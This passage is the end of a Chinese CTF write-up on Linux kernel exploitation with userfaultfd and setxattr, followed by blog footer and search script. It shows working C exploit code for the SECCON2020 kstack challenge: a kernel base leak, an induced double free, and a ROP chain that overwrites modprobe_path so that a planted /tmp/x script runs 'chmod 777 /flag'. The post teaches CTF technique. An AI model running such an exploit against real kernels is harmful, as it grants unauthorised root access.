&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork()) &#123;</span><br><span class="line">        sleep(<span class="number">20</span>);                          </span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> ret_value = <span class="number">0</span>;</span><br><span class="line">    prepare();</span><br><span class="line"></span><br><span class="line">    fd_kstack = open(<span class="string">&quot;/proc/stack&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set userfaultfd</span></span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_sleep3_handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel_base</span></span><br><span class="line">    prepare_seq_operations();           <span class="comment">// spray kernel addr in heap-0x20</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_push;</span><br><span class="line">    pthread_create(&amp;thr_push, <span class="literal">NULL</span>, push_thread, <span class="number">0</span>);        <span class="comment">// stop at copy_from_user</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);        <span class="comment">// kfree</span></span><br><span class="line">    kernel_base = ret_value - single_stop_off;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// double free</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] creating double free\n&quot;</span>);</span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_pause_handler);</span><br><span class="line">    fault_addr2 = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr2, userfaultfd_sleep3_handler);</span><br><span class="line">    fault_addr3 = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr3+<span class="number">0x1000</span>, userfaultfd_pause_handler);</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>) = add_rsp_0x1f8_ret + kernel_base;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_pause,thr_pop;</span><br><span class="line">    pthread_create(&amp;thr_pause, <span class="literal">NULL</span>, push_thread, fault_addr);      <span class="comment">// kmalloc</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_pop, <span class="literal">NULL</span>, pop_thread, fault_addr2);        <span class="comment">// first kfree</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);       <span class="comment">// double kfree</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// malloc UAF 0x20 to seq_operations</span></span><br><span class="line">    fd_seq[<span class="number">0</span>] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// malloc UAF 0x20 to write first 8 bytes</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_setxattr;</span><br><span class="line">    pthread_create(&amp;thr_setxattr, <span class="literal">NULL</span>, setxattr_thread, fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">50</span>; i &lt; <span class="number">80</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);                   <span class="comment">// double freeç ´åäº†0x20å¤§å°çš„å †ï¼Œé˜²æ­¢åç»­ç”³è¯·å‡ºé”™ï¼Œfreeä¸€äº›æ­£å¸¸å †å—ä¸Šå»</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp_fd = fd_seq[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    modprobe_path_addr += kernel_base;</span><br><span class="line">    pop_rdx_rdi_ret += kernel_base;</span><br><span class="line">    pop_rsi_ret += kernel_base;</span><br><span class="line">    mov_qp_rdx_rdi_ret += kernel_base;</span><br><span class="line">    do_task_dead += kernel_base;</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 </span></span><br><span class="line">        <span class="string">&quot;mov r13, pop_rdx_rdi_ret;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, modprobe_path_addr;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, mov_qp_rdx_rdi_ret;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x782f706d742f;&quot;</span>      <span class="comment">// bbbbbbbb     /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov rbx, pop_rsi_ret;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, do_task_dead;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ æœ¬æ–‡ç»“æŸï¼Œæ„Ÿè°¢æ‚¨çš„é˜…è¯» ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">æœ¬æ–‡ä½œè€…: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">æœ¬æ–‡é“¾æ¥: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/">http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">ç‰ˆæƒå£°æ˜: </span><span class="copyright-notice__value">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/kernel-pwn/">kernel pwn</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/04/01/230401-n1ctf2022-pwn-praymoon/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">N1CTF2022 praymoon</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/02/15/230215-linux-kernel-exploit-cheatsheet/"><span class="paginator-prev__text">linuxå†…æ ¸æ¼æ´åˆ©ç”¨cheatsheet</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">æ–‡ç« ç›®å½•</span><span class="sidebar-nav-ov">ç«™ç‚¹æ¦‚è§ˆ</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E6%A2%B3%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">
          æ¦‚å¿µæ¢³ç†</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#userfaultfd%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">
          userfaultfdç³»ç»Ÿè°ƒç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8userfaultfd"><span class="toc-number">1.1.1.</span> <span class="toc-text">
          ä½¿ç”¨userfaultfd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.1.2.</span> <span class="toc-text">
          CTFåˆ©ç”¨æ¨¡æ¿</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setxattr%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">
          setxattrç³»ç»Ÿè°ƒç”¨</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1-%E5%BC%BA%E7%BD%91%E6%9D%AF2021-notebook"><span class="toc-number">2.</span> <span class="toc-text">
          é¢˜ç›®1 - å¼ºç½‘æ¯2021 notebook</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">
          åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">
          åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp1"><span class="toc-number">2.2.1.</span> <span class="toc-text">
          exp1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp2"><span class="toc-number">2.2.2.</span> <span class="toc-text">
          exp2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp3"><span class="toc-number">2.2.3.</span> <span class="toc-text">
          exp3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp4"><span class="toc-number">2.2.4.</span> <span class="toc-text">
          exp4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp5"><span class="toc-number">2.2.5.</span> <span class="toc-text">
          exp5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">2.3.</span> <span class="toc-text">
          é—®é¢˜</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2-SECCON2020-kstack"><span class="toc-number">3.</span> <span class="toc-text">
          é¢˜ç›®2 - SECCON2020 kstack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">
          åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.2.</span> <span class="toc-text">
          åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp1-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">
          exp1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp2-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">
          exp2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp3-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">
          exp3</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">64</div><div class="sidebar-ov-state-item__name">å½’æ¡£</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">åˆ†ç±»</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">34</div><div class="sidebar-ov-state-item__name">æ ‡ç­¾</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="çŸ¥è¯†å…±äº«è®¸å¯åè®®" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">ä½ å·²é˜…è¯»äº† </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>ç”± <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> å¼ºåŠ›é©±åŠ¨</span><span> v5.3.0</span><span class="footer__devider">|</span><span>ä¸»é¢˜ - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="è®¿é—®äººæ•°"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="æµè§ˆæ€»é‡"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="æœç´¢æ–‡ç« ï¼ˆæ”¯æŒå¤šå…³é”®è¯ï¼Œè¯·ç”¨ç©ºæ ¼åˆ†éš”ï¼‰"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ æ–‡ç« æ— æ ‡é¢˜ ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'è¯·è¾“å…¥å­—ç¬¦');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>